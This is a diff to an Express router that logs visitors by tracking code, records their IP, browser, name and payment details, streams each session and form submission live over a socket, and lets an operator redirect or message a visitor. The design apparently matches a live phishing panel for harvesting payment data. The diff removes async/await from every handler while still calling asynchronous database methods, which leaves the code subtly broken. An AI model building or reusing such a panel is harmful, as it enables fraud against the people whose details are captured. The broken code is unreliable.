@@ -4,37 +4,37 @@ const { Session, Link } = require('../models');
 const { v4: uuidv4 } = require('uuid');
 const db = require('../db');
 
-router.get('/click/:code', async (req, res) => {
+router.get('/click/:code', (req, res) => {
   try {
     const visitorId = uuidv4();
     const ua = req.headers['user-agent'] || '';
-    const s = await Session.create({ trackingCode: req.params.code, visitorId, ip: req.ip, browser: ua.substring(0, 50), deviceType: /mobile/i.test(ua) ? 'Mobile' : 'Desktop', status: 'Active', isLive: true, entryUrl: req.params.code, currentUrl: req.params.code, lastActivity: new Date().toISOString(), clicks: 0 });
-    const link = await Link.findOne({ trackingCode: req.params.code });
-    if (link) await Link.findByIdAndUpdate(link._id, { total_clicks: (link.total_clicks||0)+1 });
+    const s = Session.create({ trackingCode: req.params.code, visitorId, ip: req.ip, browser: ua.substring(0, 50), deviceType: /mobile/i.test(ua) ? 'Mobile' : 'Desktop', status: 'Active', isLive: true, entryUrl: req.params.code, currentUrl: req.params.code, lastActivity: new Date().toISOString(), clicks: 0 });
+    const link = Link.findOne({ trackingCode: req.params.code });
+    if (link) Link.findByIdAndUpdate(link._id, { total_clicks: (link.total_clicks||0)+1 });
     const io = req.app.get('io'); if (io) io.emit('newSession', s);
     res.json(s);
   } catch (err) { res.status(500).json({ message: 'Server error' }); }
 });
 
-router.get('/check-redirect/:code', async (req, res) => {
+router.get('/check-redirect/:code', (req, res) => {
   try {
-    const all = await db.sessions.read();
+    const all = db.sessions.read();
     const s = all.filter(x => x.trackingCode === req.params.code && x.status === 'Redirected').sort((a,b) => new Date(b.lastActivity) - new Date(a.lastActivity))[0];
     if (s) res.json({ redirectUrl: s.currentUrl, message: s.lastMessage || '' });
     else res.json({ redirectUrl: null, message: null });
   } catch (err) { res.status(500).json({ message: 'Server error' }); }
 });
 
-router.get('/status/:visitorId', async (req, res) => {
+router.get('/status/:visitorId', (req, res) => {
   try {
-    const all = await db.sessions.read();
+    const all = db.sessions.read();
     const s = all.filter(x => x.visitorId === req.params.visitorId).sort((a,b) => new Date(b.lastActivity) - new Date(a.lastActivity))[0];
     if (!s) return res.json({ adminStatus: null });
     res.json({ adminStatus: s.adminStatus || null });
   } catch (err) { res.status(500).json({ message: 'Server error' }); }
 });
 
-router.post('/visit', async (req, res) => {
+router.post('/visit', (req, res) => {
   try {
     const { visitorId, trackingCode, browser, device, fullName, amount, paymentMode, productName, orderId } = req.body;
     const formData = {};
@@ -43,30 +43,30 @@ router.post('/visit', async (req, res) => {
     if (paymentMode) formData.paymentMode = paymentMode;
     if (productName) formData.productName = productName;
     if (orderId) formData.orderId = orderId;
-    const s = await Session.create({ trackingCode: trackingCode || 'unknown', visitorId: visitorId || uuidv4(), ip: req.ip, browser: browser || '', deviceType: device || 'Desktop', status: 'Active', isLive: true, entryUrl: trackingCode || '', currentUrl: trackingCode || '', lastActivity: new Date().toISOString(), clicks: 0, userName: fullName || '', formData: Object.keys(formData).length > 0 ? formData : undefined });
+    const s = Session.create({ trackingCode: trackingCode || 'unknown', visitorId: visitorId || uuidv4(), ip: req.ip, browser: browser || '', deviceType: device || 'Desktop', status: 'Active', isLive: true, entryUrl: trackingCode || '', currentUrl: trackingCode || '', lastActivity: new Date().toISOString(), clicks: 0, userName: fullName || '', formData: Object.keys(formData).length > 0 ? formData : undefined });
     const io = req.app.get('io'); if (io) io.emit('newSession', s);
     res.json(s);
   } catch(err) { res.status(500).json({ message: 'Server error' }); }
 });
 
-router.post('/submit', async (req, res) => {
+router.post('/submit', (req, res) => {
   try {
     const { visitorId, formData } = req.body;
     if (!visitorId) return res.status(400).json({ message: 'No visitorId' });
-    let all = await db.sessions.read(); let idx = all.findIndex(x => x.visitorId === visitorId);
-    if (idx === -1) { const s = await Session.create({ trackingCode: 'direct', visitorId, ip: req.ip, browser: 'Unknown', deviceType: 'Desktop', status: 'Active', isLive: true, formData: formData, entryUrl: '', currentUrl: '', lastActivity: new Date().toISOString(), clicks: 0 }); const io = req.app.get('io'); if (io) { io.emit('newSession', s); io.emit('formSubmitted', { visitorId, formData }); } return res.json({ message: 'Submitted' }); }
-    all[idx].formData = { ...(all[idx].formData || {}), ...formData }; all[idx].lastActivity = new Date().toISOString(); await db.sessions.write(all);
+    let all = db.sessions.read(); let idx = all.findIndex(x => x.visitorId === visitorId);
+    if (idx === -1) { const s = Session.create({ trackingCode: 'direct', visitorId, ip: req.ip, browser: 'Unknown', deviceType: 'Desktop', status: 'Active', isLive: true, formData: formData, entryUrl: '', currentUrl: '', lastActivity: new Date().toISOString(), clicks: 0 }); const io = req.app.get('io'); if (io) { io.emit('newSession', s); io.emit('formSubmitted', { visitorId, formData }); } return res.json({ message: 'Submitted' }); }
+    all[idx].formData = { ...(all[idx].formData || {}), ...formData }; all[idx].lastActivity = new Date().toISOString(); db.sessions.write(all);
     const io = req.app.get('io'); if (io) io.emit('formSubmitted', { visitorId, formData });
     res.json({ message: 'Submitted' });
   } catch(err) { res.status(500).json({ message: 'Server error' }); }
 });
 
-router.post('/heartbeat', async (req, res) => {
+router.post('/heartbeat', (req, res) => {
   try {
     const { visitorId, status } = req.body;
     if(!visitorId) return res.json({ ok: false });
-    const all = await db.sessions.read(); const i = all.findIndex(s => s.visitorId === visitorId);
-    if(i !== -1) { all[i].isLive = status !== 'Offline'; all[i].status = status === 'Offline' ? 'Offline' : 'Active'; all[i].lastActivity = new Date().toISOString(); await db.sessions.write(all); if(status === 'Offline') { const io = req.app.get('io'); if(io) io.emit('visitorOffline', { visitorId }); } }
+    const all = db.sessions.read(); const i = all.findIndex(s => s.visitorId === visitorId);
+    if(i !== -1) { all[i].isLive = status !== 'Offline'; all[i].status = status === 'Offline' ? 'Offline' : 'Active'; all[i].lastActivity = new Date().toISOString(); db.sessions.write(all); if(status === 'Offline') { const io = req.app.get('io'); if(io) io.emit('visitorOffline', { visitorId }); } }
     res.json({ ok: true });
   } catch(err) { res.status(500).json({ message: 'Server error' }); }
 });
